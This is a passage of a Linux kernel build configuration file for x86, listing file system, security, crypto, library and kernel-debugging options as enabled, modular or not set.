# CONFIG_MCB is not set

#
# Performance monitor support
#
# end of Performance monitor support

# CONFIG_RAS is not set
# CONFIG_USB4 is not set

#
# Android
#
# CONFIG_ANDROID_BINDER_IPC is not set
# end of Android

# CONFIG_LIBNVDIMM is not set
CONFIG_DAX=m
# CONFIG_NVMEM is not set

#
# HW tracing support
#
# CONFIG_STM is not set
# CONFIG_INTEL_TH is not set
# end of HW tracing support

# CONFIG_FPGA is not set
# CONFIG_TEE is not set
# CONFIG_SIOX is not set
# CONFIG_SLIMBUS is not set
# CONFIG_INTERCONNECT is not set
# CONFIG_COUNTER is not set
# CONFIG_MOST is not set
# CONFIG_PECI is not set
# CONFIG_HTE is not set
# end of Device Drivers

#
# File systems
#
CONFIG_DCACHE_WORD_ACCESS=y
# CONFIG_VALIDATE_FS_PARSER is not set
CONFIG_FS_IOMAP=y
CONFIG_EXT2_FS=y
# CONFIG_EXT2_FS_XATTR is not set
CONFIG_EXT3_FS=m
CONFIG_EXT3_FS_POSIX_ACL=y
CONFIG_EXT3_FS_SECURITY=y
CONFIG_EXT4_FS=y
CONFIG_EXT4_FS_POSIX_ACL=y
CONFIG_EXT4_FS_SECURITY=y
# CONFIG_EXT4_DEBUG is not set
CONFIG_JBD2=y
# CONFIG_JBD2_DEBUG is not set
CONFIG_FS_MBCACHE=y
# CONFIG_REISERFS_FS is not set
# CONFIG_JFS_FS is not set
# CONFIG_XFS_FS is not set
# CONFIG_GFS2_FS is not set
# CONFIG_OCFS2_FS is not set
# CONFIG_BTRFS_FS is not set
CONFIG_NILFS2_FS=m
CONFIG_F2FS_FS=m
# CONFIG_F2FS_STAT_FS is not set
CONFIG_F2FS_FS_XATTR=y
CONFIG_F2FS_FS_POSIX_ACL=y
# CONFIG_F2FS_FS_SECURITY is not set
# CONFIG_F2FS_CHECK_FS is not set
# CONFIG_F2FS_FAULT_INJECTION is not set
# CONFIG_F2FS_FS_COMPRESSION is not set
CONFIG_F2FS_IOSTAT=y
CONFIG_FS_POSIX_ACL=y
CONFIG_EXPORTFS=y
# CONFIG_EXPORTFS_BLOCK_OPS is not set
CONFIG_FILE_LOCKING=y
# CONFIG_FS_ENCRYPTION is not set
# CONFIG_FS_VERITY is not set
CONFIG_FSNOTIFY=y
CONFIG_DNOTIFY=y
CONFIG_INOTIFY_USER=y
CONFIG_FANOTIFY=y
# CONFIG_QUOTA is not set
CONFIG_AUTOFS4_FS=y
CONFIG_AUTOFS_FS=y
CONFIG_FUSE_FS=m
CONFIG_CUSE=m
CONFIG_VIRTIO_FS=m
# CONFIG_OVERLAY_FS is not set

#
# Caches
#
# CONFIG_FSCACHE is not set
# end of Caches

#
# CD-ROM/DVD Filesystems
#
CONFIG_ISO9660_FS=m
CONFIG_JOLIET=y
CONFIG_ZISOFS=y
CONFIG_UDF_FS=m
# end of CD-ROM/DVD Filesystems

#
# DOS/FAT/EXFAT/NT Filesystems
#
CONFIG_FAT_FS=m
CONFIG_MSDOS_FS=m
CONFIG_VFAT_FS=m
CONFIG_FAT_DEFAULT_CODEPAGE=437
CONFIG_FAT_DEFAULT_IOCHARSET=""iso8859-1""
# CONFIG_FAT_DEFAULT_UTF8 is not set
CONFIG_EXFAT_FS=m
CONFIG_EXFAT_DEFAULT_IOCHARSET=""utf8""
CONFIG_NTFS_FS=m
# CONFIG_NTFS_DEBUG is not set
CONFIG_NTFS_RW=y
# CONFIG_NTFS3_FS is not set
# end of DOS/FAT/EXFAT/NT Filesystems

#
# Pseudo filesystems
#
CONFIG_PROC_FS=y
# CONFIG_PROC_KCORE is not set
CONFIG_PROC_SYSCTL=y
CONFIG_PROC_PAGE_MONITOR=y
CONFIG_PROC_CHILDREN=y
CONFIG_PROC_PID_ARCH_STATUS=y
CONFIG_KERNFS=y
CONFIG_SYSFS=y
CONFIG_TMPFS=y
CONFIG_TMPFS_POSIX_ACL=y
CONFIG_TMPFS_XATTR=y
# CONFIG_TMPFS_INODE64 is not set
# CONFIG_HUGETLBFS is not set
CONFIG_ARCH_WANT_HUGETLB_PAGE_OPTIMIZE_VMEMMAP=y
CONFIG_MEMFD_CREATE=y
CONFIG_ARCH_HAS_GIGANTIC_PAGE=y
CONFIG_CONFIGFS_FS=m
CONFIG_EFIVAR_FS=m
# end of Pseudo filesystems

# CONFIG_MISC_FILESYSTEMS is not set
CONFIG_NETWORK_FILESYSTEMS=y
CONFIG_NFS_FS=m
# CONFIG_NFS_V2 is not set
CONFIG_NFS_V3=m
# CONFIG_NFS_V3_ACL is not set
CONFIG_NFS_V4=m
# CONFIG_NFS_SWAP is not set
CONFIG_NFS_V4_1=y
CONFIG_NFS_V4_2=y
CONFIG_PNFS_FILE_LAYOUT=m
CONFIG_PNFS_BLOCK=m
CONFIG_PNFS_FLEXFILE_LAYOUT=m
CONFIG_NFS_V4_1_IMPLEMENTATION_ID_DOMAIN=""kernel.org""
# CONFIG_NFS_V4_1_MIGRATION is not set
# CONFIG_NFS_USE_LEGACY_DNS is not set
CONFIG_NFS_USE_KERNEL_DNS=y
# CONFIG_NFS_DISABLE_UDP_SUPPORT is not set
# CONFIG_NFS_V4_2_READ_PLUS is not set
# CONFIG_NFSD is not set
CONFIG_GRACE_PERIOD=m
CONFIG_LOCKD=m
CONFIG_LOCKD_V4=y
CONFIG_NFS_COMMON=y
CONFIG_NFS_V4_2_SSC_HELPER=y
CONFIG_SUNRPC=m
CONFIG_SUNRPC_GSS=m
CONFIG_SUNRPC_BACKCHANNEL=y
# CONFIG_SUNRPC_DEBUG is not set
# CONFIG_CEPH_FS is not set
# CONFIG_CIFS is not set
# CONFIG_SMB_SERVER is not set
# CONFIG_CODA_FS is not set
# CONFIG_AFS_FS is not set
CONFIG_NLS=y
CONFIG_NLS_DEFAULT=""iso8859-1""
# CONFIG_NLS_CODEPAGE_437 is not set
# CONFIG_NLS_CODEPAGE_737 is not set
# CONFIG_NLS_CODEPAGE_775 is not set
CONFIG_NLS_CODEPAGE_850=m
CONFIG_NLS_CODEPAGE_852=m
# CONFIG_NLS_CODEPAGE_855 is not set
# CONFIG_NLS_CODEPAGE_857 is not set
# CONFIG_NLS_CODEPAGE_860 is not set
CONFIG_NLS_CODEPAGE_861=m
CONFIG_NLS_CODEPAGE_862=m
CONFIG_NLS_CODEPAGE_863=m
CONFIG_NLS_CODEPAGE_864=m
CONFIG_NLS_CODEPAGE_865=m
CONFIG_NLS_CODEPAGE_866=m
CONFIG_NLS_CODEPAGE_869=m
CONFIG_NLS_CODEPAGE_936=m
CONFIG_NLS_CODEPAGE_950=m
CONFIG_NLS_CODEPAGE_932=m
CONFIG_NLS_CODEPAGE_949=m
CONFIG_NLS_CODEPAGE_874=m
CONFIG_NLS_ISO8859_8=m
CONFIG_NLS_CODEPAGE_1250=m
CONFIG_NLS_CODEPAGE_1251=m
CONFIG_NLS_ASCII=m
CONFIG_NLS_ISO8859_1=m
CONFIG_NLS_ISO8859_2=m
CONFIG_NLS_ISO8859_3=m
CONFIG_NLS_ISO8859_4=m
CONFIG_NLS_ISO8859_5=m
CONFIG_NLS_ISO8859_6=m
CONFIG_NLS_ISO8859_7=m
CONFIG_NLS_ISO8859_9=m
CONFIG_NLS_ISO8859_13=m
CONFIG_NLS_ISO8859_14=m
CONFIG_NLS_ISO8859_15=m
CONFIG_NLS_KOI8_R=m
CONFIG_NLS_KOI8_U=m
CONFIG_NLS_MAC_ROMAN=m
CONFIG_NLS_MAC_CELTIC=m
CONFIG_NLS_MAC_CENTEURO=m
CONFIG_NLS_MAC_CROATIAN=m
CONFIG_NLS_MAC_CYRILLIC=m
CONFIG_NLS_MAC_GAELIC=m
CONFIG_NLS_MAC_GREEK=m
CONFIG_NLS_MAC_ICELAND=m
CONFIG_NLS_MAC_INUIT=m
CONFIG_NLS_MAC_ROMANIAN=m
CONFIG_NLS_MAC_TURKISH=m
CONFIG_NLS_UTF8=m
# CONFIG_DLM is not set
# CONFIG_UNICODE is not set
CONFIG_IO_WQ=y
# end of File systems

#
# Security options
#
CONFIG_KEYS=y
# CONFIG_KEYS_REQUEST_CACHE is not set
# CONFIG_PERSISTENT_KEYRINGS is not set
# CONFIG_TRUSTED_KEYS is not set
# CONFIG_ENCRYPTED_KEYS is not set
# CONFIG_KEY_DH_OPERATIONS is not set
# CONFIG_SECURITY_DMESG_RESTRICT is not set
# CONFIG_SECURITY is not set
# CONFIG_SECURITYFS is not set
CONFIG_HAVE_HARDENED_USERCOPY_ALLOCATOR=y
# CONFIG_HARDENED_USERCOPY is not set
# CONFIG_FORTIFY_SOURCE is not set
# CONFIG_STATIC_USERMODEHELPER is not set
# CONFIG_IMA_SECURE_AND_OR_TRUSTED_BOOT is not set
CONFIG_DEFAULT_SECURITY_DAC=y
CONFIG_LSM=""lockdown,yama,loadpin,safesetid,integrity,bpf""

#
# Kernel hardening options
#

#
# Memory initialization
#
CONFIG_CC_HAS_AUTO_VAR_INIT_PATTERN=y
CONFIG_CC_HAS_AUTO_VAR_INIT_ZERO_BARE=y
CONFIG_CC_HAS_AUTO_VAR_INIT_ZERO=y
CONFIG_INIT_STACK_NONE=y
# CONFIG_INIT_STACK_ALL_PATTERN is not set
# CONFIG_INIT_STACK_ALL_ZERO is not set
# CONFIG_INIT_ON_ALLOC_DEFAULT_ON is not set
# CONFIG_INIT_ON_FREE_DEFAULT_ON is not set
CONFIG_CC_HAS_ZERO_CALL_USED_REGS=y
# CONFIG_ZERO_CALL_USED_REGS is not set
# end of Memory initialization

CONFIG_RANDSTRUCT_NONE=y
# end of Kernel hardening options
# end of Security options

CONFIG_CRYPTO=y

#
# Crypto core or helper
#
CONFIG_CRYPTO_ALGAPI=y
CONFIG_CRYPTO_ALGAPI2=y
CONFIG_CRYPTO_AEAD=m
CONFIG_CRYPTO_AEAD2=y
CONFIG_CRYPTO_SKCIPHER=m
CONFIG_CRYPTO_SKCIPHER2=y
CONFIG_CRYPTO_HASH=y
CONFIG_CRYPTO_HASH2=y
CONFIG_CRYPTO_RNG=m
CONFIG_CRYPTO_RNG2=y
CONFIG_CRYPTO_RNG_DEFAULT=m
CONFIG_CRYPTO_AKCIPHER2=y
CONFIG_CRYPTO_KPP2=y
CONFIG_CRYPTO_KPP=m
CONFIG_CRYPTO_ACOMP2=y
CONFIG_CRYPTO_MANAGER=y
CONFIG_CRYPTO_MANAGER2=y
# CONFIG_CRYPTO_USER is not set
CONFIG_CRYPTO_MANAGER_DISABLE_TESTS=y
CONFIG_CRYPTO_NULL=m
CONFIG_CRYPTO_NULL2=y
# CONFIG_CRYPTO_CRYPTD is not set
CONFIG_CRYPTO_AUTHENC=m
# CONFIG_CRYPTO_TEST is not set
# end of Crypto core or helper

#
# Public-key cryptography
#
# CONFIG_CRYPTO_RSA is not set
# CONFIG_CRYPTO_DH is not set
CONFIG_CRYPTO_ECC=m
CONFIG_CRYPTO_ECDH=m
# CONFIG_CRYPTO_ECDSA is not set
# CONFIG_CRYPTO_ECRDSA is not set
# CONFIG_CRYPTO_SM2 is not set
# CONFIG_CRYPTO_CURVE25519 is not set
# end of Public-key cryptography

#
# Block ciphers
#
CONFIG_CRYPTO_AES=y
CONFIG_CRYPTO_AES_TI=m
# CONFIG_CRYPTO_ANUBIS is not set
# CONFIG_CRYPTO_ARIA is not set
# CONFIG_CRYPTO_BLOWFISH is not set
# CONFIG_CRYPTO_CAMELLIA is not set
# CONFIG_CRYPTO_CAST5 is not set
# CONFIG_CRYPTO_CAST6 is not set
# CONFIG_CRYPTO_DES is not set
# CONFIG_CRYPTO_FCRYPT is not set
# CONFIG_CRYPTO_KHAZAD is not set
# CONFIG_CRYPTO_SEED is not set
# CONFIG_CRYPTO_SERPENT is not set
# CONFIG_CRYPTO_SM4_GENERIC is not set
# CONFIG_CRYPTO_TEA is not set
# CONFIG_CRYPTO_TWOFISH is not set
# end of Block ciphers

#
# Length-preserving ciphers and modes
#
CONFIG_CRYPTO_ADIANTUM=m
# CONFIG_CRYPTO_ARC4 is not set
CONFIG_CRYPTO_CHACHA20=m
CONFIG_CRYPTO_CBC=m
CONFIG_CRYPTO_CFB=m
# CONFIG_CRYPTO_CTR is not set
# CONFIG_CRYPTO_CTS is not set
# CONFIG_CRYPTO_ECB is not set
# CONFIG_CRYPTO_HCTR2 is not set
# CONFIG_CRYPTO_KEYWRAP is not set
# CONFIG_CRYPTO_LRW is not set
CONFIG_CRYPTO_OFB=m
# CONFIG_CRYPTO_PCBC is not set
# CONFIG_CRYPTO_XTS is not set
CONFIG_CRYPTO_NHPOLY1305=m
# end of Length-preserving ciphers and modes

#
# AEAD (authenticated encryption with associated data) ciphers
#
CONFIG_CRYPTO_AEGIS128=m
# CONFIG_CRYPTO_CHACHA20POLY1305 is not set
# CONFIG_CRYPTO_CCM is not set
# CONFIG_CRYPTO_GCM is not set
# CONFIG_CRYPTO_SEQIV is not set
CONFIG_CRYPTO_ECHAINIV=m
CONFIG_CRYPTO_ESSIV=m
# end of AEAD (authenticated encryption with associated data) ciphers

#
# Hashes, digests, and MACs
#
CONFIG_CRYPTO_BLAKE2B=m
# CONFIG_CRYPTO_CMAC is not set
# CONFIG_CRYPTO_GHASH is not set
CONFIG_CRYPTO_HMAC=y
# CONFIG_CRYPTO_MD4 is not set
# CONFIG_CRYPTO_MD5 is not set
# CONFIG_CRYPTO_MICHAEL_MIC is not set
CONFIG_CRYPTO_POLY1305=m
# CONFIG_CRYPTO_RMD160 is not set
# CONFIG_CRYPTO_SHA1 is not set
CONFIG_CRYPTO_SHA256=y
CONFIG_CRYPTO_SHA512=m
CONFIG_CRYPTO_SHA3=m
# CONFIG_CRYPTO_SM3_GENERIC is not set
CONFIG_CRYPTO_STREEBOG=m
# CONFIG_CRYPTO_VMAC is not set
# CONFIG_CRYPTO_WP512 is not set
# CONFIG_CRYPTO_XCBC is not set
CONFIG_CRYPTO_XXHASH=m
# end of Hashes, digests, and MACs

#
# CRCs (cyclic redundancy checks)
#
CONFIG_CRYPTO_CRC32C=y
CONFIG_CRYPTO_CRC32=m
# CONFIG_CRYPTO_CRCT10DIF is not set
# CONFIG_CRYPTO_CRC64_ROCKSOFT is not set
# end of CRCs (cyclic redundancy checks)

#
# Compression
#
# CONFIG_CRYPTO_DEFLATE is not set
# CONFIG_CRYPTO_LZO is not set
# CONFIG_CRYPTO_842 is not set
# CONFIG_CRYPTO_LZ4 is not set
# CONFIG_CRYPTO_LZ4HC is not set
CONFIG_CRYPTO_ZSTD=m
# end of Compression

#
# Random number generation
#
CONFIG_CRYPTO_ANSI_CPRNG=m
CONFIG_CRYPTO_DRBG_MENU=m
CONFIG_CRYPTO_DRBG_HMAC=y
# CONFIG_CRYPTO_DRBG_HASH is not set
# CONFIG_CRYPTO_DRBG_CTR is not set
CONFIG_CRYPTO_DRBG=m
CONFIG_CRYPTO_JITTERENTROPY=m
# end of Random number generation

#
# Userspace interface
#
CONFIG_CRYPTO_USER_API=y
CONFIG_CRYPTO_USER_API_HASH=y
# CONFIG_CRYPTO_USER_API_SKCIPHER is not set
# CONFIG_CRYPTO_USER_API_RNG is not set
# CONFIG_CRYPTO_USER_API_AEAD is not set
CONFIG_CRYPTO_USER_API_ENABLE_OBSOLETE=y
# end of Userspace interface

#
# Accelerated Cryptographic Algorithms for CPU (x86)
#
# CONFIG_CRYPTO_CURVE25519_X86 is not set
# CONFIG_CRYPTO_AES_NI_INTEL is not set
# CONFIG_CRYPTO_BLOWFISH_X86_64 is not set
# CONFIG_CRYPTO_CAMELLIA_X86_64 is not set
# CONFIG_CRYPTO_CAMELLIA_AESNI_AVX_X86_64 is not set
# CONFIG_CRYPTO_CAMELLIA_AESNI_AVX2_X86_64 is not set
# CONFIG_CRYPTO_CAST5_AVX_X86_64 is not set
# CONFIG_CRYPTO_CAST6_AVX_X86_64 is not set
# CONFIG_CRYPTO_DES3_EDE_X86_64 is not set
# CONFIG_CRYPTO_SERPENT_SSE2_X86_64 is not set
# CONFIG_CRYPTO_SERPENT_AVX_X86_64 is not set
# CONFIG_CRYPTO_SERPENT_AVX2_X86_64 is not set
# CONFIG_CRYPTO_SM4_AESNI_AVX_X86_64 is not set
# CONFIG_CRYPTO_SM4_AESNI_AVX2_X86_64 is not set
# CONFIG_CRYPTO_TWOFISH_X86_64 is not set
# CONFIG_CRYPTO_TWOFISH_X86_64_3WAY is not set
# CONFIG_CRYPTO_TWOFISH_AVX_X86_64 is not set
# CONFIG_CRYPTO_ARIA_AESNI_AVX_X86_64 is not set
# CONFIG_CRYPTO_CHACHA20_X86_64 is not set
# CONFIG_CRYPTO_AEGIS128_AESNI_SSE2 is not set
# CONFIG_CRYPTO_NHPOLY1305_SSE2 is not set
# CONFIG_CRYPTO_NHPOLY1305_AVX2 is not set
# CONFIG_CRYPTO_BLAKE2S_X86 is not set
# CONFIG_CRYPTO_POLYVAL_CLMUL_NI is not set
# CONFIG_CRYPTO_POLY1305_X86_64 is not set
# CONFIG_CRYPTO_SHA1_SSSE3 is not set
# CONFIG_CRYPTO_SHA256_SSSE3 is not set
# CONFIG_CRYPTO_SHA512_SSSE3 is not set
# CONFIG_CRYPTO_SM3_AVX_X86_64 is not set
# CONFIG_CRYPTO_GHASH_CLMUL_NI_INTEL is not set
# CONFIG_CRYPTO_CRC32C_INTEL is not set
# CONFIG_CRYPTO_CRC32_PCLMUL is not set
# end of Accelerated Cryptographic Algorithms for CPU (x86)

# CONFIG_CRYPTO_HW is not set
# CONFIG_ASYMMETRIC_KEY_TYPE is not set

#
# Certificates for signature checking
#
# CONFIG_SYSTEM_BLACKLIST_KEYRING is not set
# end of Certificates for signature checking

CONFIG_BINARY_PRINTF=y

#
# Library routines
#
# CONFIG_PACKING is not set
CONFIG_BITREVERSE=y
CONFIG_GENERIC_STRNCPY_FROM_USER=y
CONFIG_GENERIC_STRNLEN_USER=y
CONFIG_GENERIC_NET_UTILS=y
# CONFIG_CORDIC is not set
# CONFIG_PRIME_NUMBERS is not set
CONFIG_RATIONAL=y
CONFIG_GENERIC_PCI_IOMAP=y
CONFIG_GENERIC_IOMAP=y
CONFIG_ARCH_USE_CMPXCHG_LOCKREF=y
CONFIG_ARCH_HAS_FAST_MULTIPLIER=y
CONFIG_ARCH_USE_SYM_ANNOTATIONS=y

#
# Crypto library routines
#
CONFIG_CRYPTO_LIB_UTILS=y
CONFIG_CRYPTO_LIB_AES=y
CONFIG_CRYPTO_LIB_BLAKE2S_GENERIC=y
CONFIG_CRYPTO_LIB_CHACHA_GENERIC=m
CONFIG_CRYPTO_LIB_CHACHA=m
CONFIG_CRYPTO_LIB_CURVE25519_GENERIC=m
CONFIG_CRYPTO_LIB_CURVE25519=m
CONFIG_CRYPTO_LIB_POLY1305_RSIZE=11
CONFIG_CRYPTO_LIB_POLY1305_GENERIC=m
CONFIG_CRYPTO_LIB_POLY1305=m
CONFIG_CRYPTO_LIB_CHACHA20POLY1305=m
CONFIG_CRYPTO_LIB_SHA1=y
CONFIG_CRYPTO_LIB_SHA256=y
# end of Crypto library routines

# CONFIG_CRC_CCITT is not set
CONFIG_CRC16=y
# CONFIG_CRC_T10DIF is not set
# CONFIG_CRC64_ROCKSOFT is not set
CONFIG_CRC_ITU_T=m
CONFIG_CRC32=y
# CONFIG_CRC32_SELFTEST is not set
CONFIG_CRC32_SLICEBY8=y
# CONFIG_CRC32_SLICEBY4 is not set
# CONFIG_CRC32_SARWATE is not set
# CONFIG_CRC32_BIT is not set
CONFIG_CRC64=m
CONFIG_CRC4=m
# CONFIG_CRC7 is not set
# CONFIG_LIBCRC32C is not set
# CONFIG_CRC8 is not set
CONFIG_XXHASH=m
# CONFIG_RANDOM32_SELFTEST is not set
CONFIG_ZLIB_INFLATE=m
CONFIG_ZSTD_COMMON=m
CONFIG_ZSTD_COMPRESS=m
CONFIG_ZSTD_DECOMPRESS=m
# CONFIG_XZ_DEC is not set
CONFIG_ASSOCIATIVE_ARRAY=y
CONFIG_HAS_IOMEM=y
CONFIG_HAS_IOPORT_MAP=y
CONFIG_HAS_DMA=y
CONFIG_NEED_SG_DMA_LENGTH=y
CONFIG_NEED_DMA_MAP_STATE=y
CONFIG_ARCH_DMA_ADDR_T_64BIT=y
CONFIG_SWIOTLB=y
# CONFIG_DMA_API_DEBUG is not set
CONFIG_SGL_ALLOC=y
CONFIG_DQL=y
CONFIG_NLATTR=y
# CONFIG_IRQ_POLL is not set
CONFIG_OID_REGISTRY=m
CONFIG_UCS2_STRING=y
CONFIG_HAVE_GENERIC_VDSO=y
CONFIG_GENERIC_GETTIMEOFDAY=y
CONFIG_GENERIC_VDSO_TIME_NS=y
CONFIG_FONT_SUPPORT=y
CONFIG_FONT_8x16=y
CONFIG_FONT_AUTOSELECT=y
CONFIG_SG_POOL=y
CONFIG_ARCH_HAS_PMEM_API=y
CONFIG_ARCH_HAS_UACCESS_FLUSHCACHE=y
CONFIG_ARCH_HAS_COPY_MC=y
CONFIG_ARCH_STACKWALK=y
CONFIG_STACKDEPOT=y
CONFIG_SBITMAP=y
# end of Library routines

#
# Kernel hacking
#

#
# printk and dmesg options
#
# CONFIG_PRINTK_TIME is not set
# CONFIG_PRINTK_CALLER is not set
# CONFIG_STACKTRACE_BUILD_ID is not set
CONFIG_CONSOLE_LOGLEVEL_DEFAULT=7
CONFIG_CONSOLE_LOGLEVEL_QUIET=4
CONFIG_MESSAGE_LOGLEVEL_DEFAULT=4
# CONFIG_BOOT_PRINTK_DELAY is not set
# CONFIG_DYNAMIC_DEBUG is not set
# CONFIG_DYNAMIC_DEBUG_CORE is not set
# CONFIG_SYMBOLIC_ERRNAME is not set
CONFIG_DEBUG_BUGVERBOSE=y
# end of printk and dmesg options

CONFIG_DEBUG_KERNEL=y
# CONFIG_DEBUG_MISC is not set

#
# Compile-time checks and compiler options
#
CONFIG_AS_HAS_NON_CONST_LEB128=y
CONFIG_DEBUG_INFO_NONE=y
# CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT is not set
# CONFIG_DEBUG_INFO_DWARF4 is not set
# CONFIG_DEBUG_INFO_DWARF5 is not set
CONFIG_FRAME_WARN=1024
# CONFIG_STRIP_ASM_SYMS is not set
# CONFIG_READABLE_ASM is not set
# CONFIG_HEADERS_INSTALL is not set
# CONFIG_DEBUG_SECTION_MISMATCH is not set
CONFIG_SECTION_MISMATCH_WARN_ONLY=y
CONFIG_FRAME_POINTER=y
CONFIG_OBJTOOL=y
CONFIG_STACK_VALIDATION=y
# CONFIG_DEBUG_FORCE_WEAK_PER_CPU is not set
# end of Compile-time checks and compiler options

#
# Generic Kernel Debugging Instruments
#
# CONFIG_MAGIC_SYSRQ is not set
# CONFIG_DEBUG_FS is not set
CONFIG_HAVE_ARCH_KGDB=y
# CONFIG_KGDB is not set
CONFIG_ARCH_HAS_UBSAN_SANITIZE_ALL=y
# CONFIG_UBSAN is not set
CONFIG_HAVE_ARCH_KCSAN=y
CONFIG_HAVE_KCSAN_COMPILER=y
# CONFIG_KCSAN is not set
# end of Generic Kernel Debugging Instruments

#
# Networking Debugging
#
# CONFIG_NET_DEV_REFCNT_TRACKER is not set
# CONFIG_NET_NS_REFCNT_TRACKER is not set
# CONFIG_DEBUG_NET is not set
# end of Networking Debugging

#
# Memory Debugging
#
# CONFIG_PAGE_EXTENSION is not set
# CONFIG_DEBUG_PAGEALLOC is not set
CONFIG_SLUB_DEBUG=y
# CONFIG_SLUB_DEBUG_ON is not set
# CONFIG_PAGE_OWNER is not set
# CONFIG_PAGE_TABLE_CHECK is not set
# CONFIG_PAGE_POISONING is not set
CONFIG_DEBUG_RODATA_TEST=y
CONFIG_ARCH_HAS_DEBUG_WX=y
# CONFIG_DEBUG_WX is not set
CONFIG_GENERIC_PTDUMP=y
# CONFIG_DEBUG_OBJECTS is not set
CONFIG_HAVE_DEBUG_KMEMLEAK=y
# CONFIG_DEBUG_KMEMLEAK is not set
# CONFIG_DEBUG_STACK_USAGE is not set
# CONFIG_SCHED_STACK_END_CHECK is not set
CONFIG_ARCH_HAS_DEBUG_VM_PGTABLE=y
# CONFIG_DEBUG_VM is not set
# CONFIG_DEBUG_VM_PGTABLE is not set
CONFIG_ARCH_HAS_DEBUG_VIRTUAL=y
# CONFIG_DEBUG_VIRTUAL is not set
CONFIG_DEBUG_MEMORY_INIT=y
CONFIG_ARCH_SUPPORTS_KMAP_LOCAL_FORCE_MAP=y
# CONFIG_DEBUG_KMAP_LOCAL_FORCE_MAP is not set
CONFIG_HAVE_ARCH_KASAN=y
CONFIG_HAVE_ARCH_KASAN_VMALLOC=y
CONFIG_CC_HAS_KASAN_GENERIC=y
CONFIG_CC_HAS_KASAN_SW_TAGS=y
CONFIG_CC_HAS_WORKING_NOSANITIZE_ADDRESS=y
# CONFIG_KASAN is not set
CONFIG_HAVE_ARCH_KFENCE=y
# CONFIG_KFENCE is not set
CONFIG_HAVE_ARCH_KMSAN=y
# end of Memory Debugging

# CONFIG_DEBUG_SHIRQ is not set

#
# Debug Oops, Lockups and Hangs
#
# CONFIG_PANIC_ON_OOPS is not set
CONFIG_PANIC_ON_OOPS_VALUE=0
CONFIG_PANIC_TIMEOUT=0
# CONFIG_SOFTLOCKUP_DETECTOR is not set
CONFIG_HARDLOCKUP_CHECK_TIMESTAMP=y
# CONFIG_HARDLOCKUP_DETECTOR is not set
# CONFIG_DETECT_HUNG_TASK is not set
# CONFIG_WQ_WATCHDOG is not set
# CONFIG_TEST_LOCKUP is not set
# end of Debug Oops, Lockups and Hangs

#
# Scheduler Debugging
#
# CONFIG_SCHED_DEBUG is not set
# CONFIG_SCHEDSTATS is not set
# end of Scheduler Debugging

# CONFIG_DEBUG_TIMEKEEPING is not set
CONFIG_DEBUG_PREEMPT=y

#
# Lock Debugging (spinlocks, mutexes, etc...)
#
CONFIG_LOCK_DEBUGGING_SUPPORT=y
# CONFIG_PROVE_LOCKING is not set
# CONFIG_LOCK_STAT is not set
# CONFIG_DEBUG_RT_MUTEXES is not set
# CONFIG_DEBUG_SPINLOCK is not set
# CONFIG_DEBUG_MUTEXES is not set
# CONFIG_DEBUG_WW_MUTEX_SLOWPATH is not set
# CONFIG_DEBUG_RWSEMS is not set
# CONFIG_DEBUG_LOCK_ALLOC is not set
# CONFIG_DEBUG_ATOMIC_SLEEP is not set
# CONFIG_DEBUG_LOCKING_API_SELFTESTS is not set
# CONFIG_LOCK_TORTURE_TEST is not set
# CONFIG_WW_MUTEX_SELFTEST is not set
# CONFIG_SCF_TORTURE_TEST is not set
# CONFIG_CSD_LOCK_WAIT_DEBUG is not set
# end of Lock Debugging (spinlocks, mutexes, etc...)

# CONFIG_DEBUG_IRQFLAGS is not set
CONFIG_STACKTRACE=y
# CONFIG_WARN_ALL_UNSEEDED_RANDOM is not set
# CONFIG_DEBUG_KOBJECT is not set

#
# Debug kernel data structures
#
# CONFIG_DEBUG_LIST is not set
# CONFIG_DEBUG_PLIST is not set
# CONFIG_DEBUG_SG is not set
# CONFIG_DEBUG_NOTIFIERS is not set
# CONFIG_BUG_ON_DATA_CORRUPTION is not set
# CONFIG_DEBUG_MAPLE_TREE is not set
# end of Debug kernel data structures

# CONFIG_DEBUG_CREDENTIALS is not set

#
# RCU Debugging
#
# CONFIG_RCU_SCALE_TEST is not set
# CONFIG_RCU_TORTURE_TEST is not set
# CONFIG_RCU_REF_SCALE_TEST is not set
CONFIG_RCU_CPU_STALL_TIMEOUT=21
CONFIG_RCU_EXP_CPU_STALL_TIMEOUT=0
# CONFIG_RCU_TRACE is not set
# CONFIG_RCU_EQS_DEBUG is not set
# end of RCU Debugging

# CONFIG_DEBUG_WQ_FORCE_RR_CPU is not set
# CONFIG_LATENCYTOP is not set
CONFIG_USER_STACKTRACE_SUPPORT=y
CONFIG_HAVE_RETHOOK=y
CONFIG_HAVE_FUNCTION_TRACER=y
CONFIG_HAVE_DYNAMIC_FTRACE=y
CONFIG_HAVE_DYNAMIC_FTRACE_WITH_REGS=y
CONFIG_HAVE_DYNAMIC_FTRACE_WITH_DIRECT_CALLS=y
CONFIG_HAVE_DYNAMIC_FTRACE_WITH_ARGS=y
CONFIG_HAVE_DYNAMIC_FTRACE_NO_PATCHABLE=y
CONFIG_HAVE_FTRACE_MCOUNT_RECORD=y
CONFIG_HAVE_SYSCALL_TRACEPOINTS=y
CONFIG_HAVE_FENTRY=y
CONFIG_HAVE_OBJTOOL_MCOUNT=y
CONFIG_HAVE_C_RECORDMCOUNT=y
CONFIG_HAVE_BUILDTIME_MCOUNT_SORT=y
CONFIG_TRACING_SUPPORT=y
# CONFIG_FTRACE is not set
# CONFIG_PROVIDE_OHCI1394_DMA_INIT is not set
# CONFIG_SAMPLES is not set
CONFIG_HAVE_SAMPLE_FTRACE_DIRECT=y
CONFIG_HAVE_SAMPLE_FTRACE_DIRECT_MULTI=y
CONFIG_ARCH_HAS_DEVMEM_IS_ALLOWED=y
# CONFIG_STRICT_DEVMEM is not set

#
# x86 Debugging
#
CONFIG_X86_VERBOSE_BOOTUP=y
CONFIG_EARLY_PRINTK=y
# CONFIG_EARLY_PRINTK_DBGP is not set
# CONFIG_EARLY_PRINTK_USB_XDBC is not set
# CONFIG_EFI_PGT_DUMP is not set
# CONFIG_DEBUG_TLBFLUSH is not set
CONFIG_HAVE_MMIOTRACE_SUPPORT=y
# CONFIG_X86_DECODER_SELFTEST is not set
CONFIG_IO_DELAY_0X80=y
# CONFIG_IO_DELAY_0XED is not set
# CONFIG_IO_DELAY_UDELAY is not set
# CONFIG_IO_DELAY_NONE is not set
# CONFIG_CPA_DEBUG is not set
# CONFIG_DEBUG_ENTRY is not set
# CONFIG_DEBUG_NMI_SELFTEST is not set
CONFIG_X86_DEBUG_FPU=y
# CONFIG_PUNIT_ATOM_DEBUG is not set
# CONFIG_UNWINDER_ORC is not set
